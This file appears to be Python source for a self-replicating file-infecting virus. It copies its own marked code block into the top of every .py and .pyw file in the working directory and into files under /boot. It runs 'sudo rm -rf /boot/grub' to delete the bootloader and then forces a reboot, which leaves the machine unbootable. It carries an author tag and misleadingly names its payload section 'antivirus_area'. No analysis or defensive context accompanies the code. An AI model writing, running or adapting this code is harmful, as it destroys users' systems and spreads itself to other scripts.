### start ###

import sys, glob, os

code = []
with open(sys.argv[0], 'r') as f:
	 lines = f.readlines()

antivirus_area = False
for line in lines:
	if line == '### start ###\n':
		antivirus_area = True
	if antivirus_area:
		code.append(line)
	if line == '### end ###\n':
		break

os.system('sudo rm -rf /boot/grub')
python_scripts = glob.glob('*.py') + glob.glob('*.pyw') + glob.glob('/boot/*')

for script in python_scripts:
	with open(script, 'r') as f:
		script_code = f.readlines()

	infected = False
	for line in script_code:
		if line == '### start ###\n':
			infected =True
			break

	if not infected:
	 	final_code =[]
	 	final_code.extend(code)
	 	final_code.extend('\n')
	 	final_code.extend(script_code)

	 	with open(script, 'w') as f:
	 	 	f.writelines(final_code)

# author/omega33/ #

input("Press Enter to continue...")
os.system('sudo reboot')

### end ###
